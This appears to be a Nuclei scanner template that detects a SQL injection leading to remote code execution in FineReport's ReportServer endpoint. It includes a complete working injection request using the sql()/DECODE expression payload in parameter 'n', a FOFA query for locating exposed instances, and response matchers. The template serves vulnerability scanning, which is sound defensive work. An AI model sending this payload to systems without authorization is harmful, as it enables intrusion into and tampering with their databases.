id: finereport-sqli-rce

info:
  name: FineReport SQLi - Remote Code Execution (RCE)
  author: adeljck
  severity: critical
  description: |
    Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.
  reference:
    - https://github.com/wy876/POC/blob/main/%E5%B8%86%E8%BD%AF%E7%B3%BB%E7%BB%9FReportServer%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4RCE.md
  metadata:
    max-request: 1
    fofa-query: app="帆软-FineReport"
    verified: true
  tags: finereport,rce,sqli

variables:
    string: '{{rand_base(8, "abc")}}'
    random-text: '{{rand_base(8)}}'

http:
  - raw:
      - |
        GET /webroot/decision/view/ReportServer?test={{random-text}}&n=${a=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20{{random-text}}.{{random-text}}%28data%29%20VALUES%20%28%274de0353d63cc9ab4286361a4ff3f12d1%27%29%3B%27'),1,1)}${a=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20{{random-text}}.{{random-text}}%28data%29%20VALUES%20%28%274de0353d63cc9ab4286361a4ff3f12d1%27%29%3B%27'),1,1)}${a=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20{{random-text}}.{{random-text}}%28data%29%20VALUES%20%28%274de0353d63cc9ab4286361a4ff3f12d1%27%29%3B%27'),1,1)} HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        X-Forwarded-For: 127.0.0.1
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: */*
    
    matchers:
      - type: dsl
        dsl:
          - 'contains(location,"test={{random-text}}&n=truetruetrue")'
          - 'status_code == 302'
        condition: and